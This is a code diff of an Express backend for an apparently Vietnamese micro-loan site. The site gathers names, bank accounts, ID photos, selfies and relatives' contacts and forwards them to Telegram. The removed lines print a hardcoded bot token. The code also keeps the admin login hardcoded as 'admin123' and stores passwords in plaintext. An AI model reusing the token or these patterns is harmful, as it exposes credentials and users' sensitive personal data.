@@ -8,12 +8,12 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// CẤU HÌNH TELEGRAM BOT
-const TELEGRAM_BOT_TOKEN = '8999331195:AAFgHthGvHsksplYrygVPrRFPj3JY9ltHL4';
-const TELEGRAM_CHAT_ID = '5990088732';
+// ĐỌC BOT TOKEN VÀ CHAT ID TỪ BIẾN MÔI TRƯỜNG (ENVIRONMENT VARIABLES)
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
 
 async function sendTelegram(message) {
-    if (TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') return;
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
     try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -38,22 +38,19 @@ app.post('/api/register', (req, res) => {
     const newUser = { id: Date.now(), name, phone, password, rank: 'Đồng (Mới)', completedLoans: 0 };
     users.push(newUser);
 
-    // Gửi thông báo Telegram
     sendTelegram(`🆕 <b>THÀNH VIÊN MỚI ĐĂNG KÝ</b>\n👤 <b>Họ tên:</b> ${name}\n📞 <b>SĐT:</b> ${phone}\n🏆 <b>Cấp bậc:</b> Mới (Hạn mức 500k)`);
 
     res.json({ success: true, user: newUser });
 });
 
-// API 2: NỘP HỒ SƠ VAY & KHÓA HẠN MỨC 500K
+// API 2: NỘP HỒ SƠ VAY & KHÓA HẠN MỨC 500K KHÁCH MỚI
 const upload = multer({ dest: 'uploads/' });
 app.post('/api/submit-loan', upload.fields([{ name: 'cccdFront' }, { name: 'selfie' }]), (req, res) => {
     const { fullName, phone, bankName, bankAccount, amount, days, relativeRelation, relativeName, relativePhone } = req.body;
     
-    // Kiểm tra cấp bậc thành viên
     const user = users.find(u => u.phone === phone);
     const completedCount = user ? user.completedLoans : 0;
     
-    // Nếu vay lần đầu (dưới 3 lần) mà chọn số tiền > 500k
     if (completedCount < 3 && parseInt(amount) > 500000) {
         return res.json({ success: false, message: 'Thành viên mới chỉ được vay tối đa 500.000 VNĐ. Hãy hoàn thành 3-5 khoản vay để mở khóa hạn mức cao hơn!' });
     }
@@ -67,13 +64,12 @@ app.post('/api/submit-loan', upload.fields([{ name: 'cccdFront' }, { name: 'self
     };
     loans.push(newLoan);
 
-    // Gửi thông báo Telegram
     sendTelegram(`🚨 <b>HỒ SƠ VAY MỚI (#${loanId})</b>\n👤 <b>Họ tên:</b> ${fullName}\n📞 <b>SĐT:</b> ${phone}\n💰 <b>Số tiền:</b> ${new Intl.NumberFormat('vi-VN').format(amount)} VNĐ (${days} ngày)\n🏦 <b>Ngân hàng:</b> ${bankName} - ${bankAccount}\n👨‍👩‍👧 <b>Người thân:</b> ${relativeName} (${relativeRelation} - ${relativePhone})`);
 
     res.json({ success: true, loanId });
 });
 
-// API 3: DÀNH CHO ADMIN - TRA CỨU & DUYỆT HỒ SƠ
+// API 3: DÀNH CHO ADMIN
 app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body;
     if (username === 'admin' && password === 'admin123') {
@@ -95,8 +91,6 @@ app.post('/api/admin/update-status', (req, res) => {
             const user = users.find(u => u.phone === loan.phone);
             if (user) {
                 user.completedLoans += 1;
-                if (user.completedLoans >= 3) user.rank = 'Bạc (Hạn mức 5M)';
-                if (user.completedLoans >= 6) user.rank = 'Vàng (Hạn mức 15M)';
             }
         }
         sendTelegram(`📢 <b>CẬP NHẬT TRẠNG THÁI HỒ SƠ #${loanId}</b>\nTrạng thái mới: <b>${status}</b>`);
@@ -105,6 +99,11 @@ app.post('/api/admin/update-status', (req, res) => {
     res.json({ success: false });
 });
 
-const PORT = process.env.PORT || 3000;
+// PHỤC VỤ TRANG CHỦ PROD
+app.get('*', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-         
+        
